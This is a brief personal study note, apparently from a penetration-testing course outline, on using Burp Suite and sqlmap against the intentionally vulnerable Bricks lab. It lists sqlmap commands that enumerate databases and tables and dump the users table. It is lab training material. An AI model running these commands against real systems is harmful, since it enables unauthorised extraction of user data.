    Testing some vulnerable Applications
        Bricks
            we have different login pages with different problems to test and learn SQL injection!
            here we can intercept a request to this login page by BurpSuite and save it to a file to give it to the SQLMap.
                instead of this, we should enter all parameters to the SQLMap by manually/hand!
                    command:
                        like sqlmap -r /tmp/file.txt --dbs
                            it will find and list all Databases if it can and any other functionalities ;)
                        like sqlmap -r /tmp/file.txt -D bricks
                            it will get all Database Tables
                        like sqlmap -r /tmp/file.txt -D bricks -T users --dump
                            it will get all records of the users Table
